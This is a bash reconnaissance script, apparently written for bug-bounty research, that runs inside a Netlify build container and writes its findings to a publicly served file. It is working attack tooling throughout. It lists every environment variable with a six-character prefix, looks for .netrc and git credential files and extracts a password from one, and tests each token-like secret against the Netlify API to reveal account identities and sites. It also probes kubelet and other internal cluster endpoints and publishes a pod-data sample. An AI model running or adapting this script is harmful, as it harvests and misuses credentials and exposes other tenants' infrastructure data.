#!/usr/bin/env bash
# H1 build-container recon v4 (read-only, RoE-clean, low-and-slow). Researcher: abedalaziz123sayed.
# Tests candidate credentials IN-BUILD and exfils ONLY non-secret RESULTS (identity/scope/codes)
# to public/recon4.txt. Full token values NEVER leave the build. Redacted env only.
set +e
PUB="public/recon4.txt"; mkdir -p public; : > "$PUB"
p(){ echo "$*" >> "$PUB"; }
UA="abedalaziz123sayed-h1-research"
API="https://api.netlify.com/api/v1"
# my own identities (to detect cross-tenant): nl1 acct slug abedalaziz123sayed, nl2 slug azizsayed360
p "=====RECON4 START====="
p "id=$(id) node=$HOST_NODE_IP site_env=$SITE_ID acct_env=$ACCOUNT_ID deploy_env=$DEPLOY_ID"

p "## ENV_REDACTED (key len prefix6)"
while IFS='=' read -r k v; do p "$k len=${#v} pfx=$(printf '%s' "$v" | head -c6)"; done < <(env | sort)

p "## TOKEN_FILES"
for f in "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml"; do
  [ -f "$f" ] && p "$f EXISTS bytes=$(wc -c <"$f")" || p "$f absent"
done
p "git_remote=$(git config --get remote.origin.url 2>/dev/null | sed -E 's#//[^@]*@#//REDACTED@#')"
# also scan any netrc/credential content for a bearer we can test (redacted)
NETRC_TOK=$(awk '/password/{print $2}' "$HOME/.netrc" 2>/dev/null | head -1)

p "## TOKEN_IDENTITY+SCOPE (only 200s reported; token value hidden)"
test_tok(){
  local label="$1" tok="$2"
  [ -z "$tok" ] && return
  local code who
  code=$(curl -s -o /tmp/w -w '%{http_code}' --max-time 6 -H "Authorization: Bearer $tok" -H "User-Agent: $UA" "$API/user" 2>/dev/null)
  if [ "$code" = "200" ]; then
    who=$(python3 -c "import json;d=json.load(open('/tmp/w'));print('uid='+str(d.get('id'))+' email='+str(d.get('email')))" 2>/dev/null)
    local ns na slugs
    curl -s -o /tmp/s --max-time 6 -H "Authorization: Bearer $tok" -H "User-Agent: $UA" "$API/sites?per_page=50" 2>/dev/null
    curl -s -o /tmp/a --max-time 6 -H "Authorization: Bearer $tok" -H "User-Agent: $UA" "$API/accounts" 2>/dev/null
    ns=$(python3 -c "import json;print(len(json.load(open('/tmp/s'))))" 2>/dev/null)
    na=$(python3 -c "import json;print(len(json.load(open('/tmp/a'))))" 2>/dev/null)
    slugs=$(python3 -c "import json;d=json.load(open('/tmp/a'));print(','.join(sorted(set(str(x.get('slug')) for x in d))[:8]))" 2>/dev/null)
    p "TOKEN[$label] /user=200 :: $who | sites=$ns accounts=$na acct_slugs=[$slugs]"
  else
    p "TOKEN[$label] /user=$code (not a valid api token)"
  fi
}
# candidate tokens: any env value that looks like a token (charset + length)
env | while IFS='=' read -r k v; do
  case "$v" in
    *[!A-Za-z0-9._-]*) continue ;;  # skip values with spaces/special
  esac
  [ ${#v} -ge 24 ] && test_tok "env:$k" "$v"
done
test_tok "netrc" "$NETRC_TOK"

p "## HOST_NODE + INTERNAL reachability (codes)"
code(){ curl -s -k -o /dev/null -w '%{http_code}' --max-time 4 "$1" 2>/dev/null; }
p "kubelet_10255_pods=$(code http://$HOST_NODE_IP:10255/pods)"
p "kubelet_10250_pods=$(code https://$HOST_NODE_IP:10250/pods)"
p "node_9100_metrics=$(code http://$HOST_NODE_IP:9100/metrics)"
p "cadvisor_4194=$(code http://$HOST_NODE_IP:4194/api/v1.3/subcontainers)"
p "functions_origin=$(code https://functions-origin-api.services-prod.nsvcs.net/)"
p "nfserverapi=$(code https://nf-server-api.services-prod.nsvcs.net/)"
# small redacted sample of kubelet pods if reachable (proves control-plane data, minimal touch)
KP=$(curl -s -k --max-time 4 "http://$HOST_NODE_IP:10255/pods" 2>/dev/null | head -c 400)
[ -n "$KP" ] && p "kubelet_sample_first400=$(printf '%s' "$KP" | tr -d '\n' | head -c 400)"
p "=====RECON4 END====="
cat "$PUB"
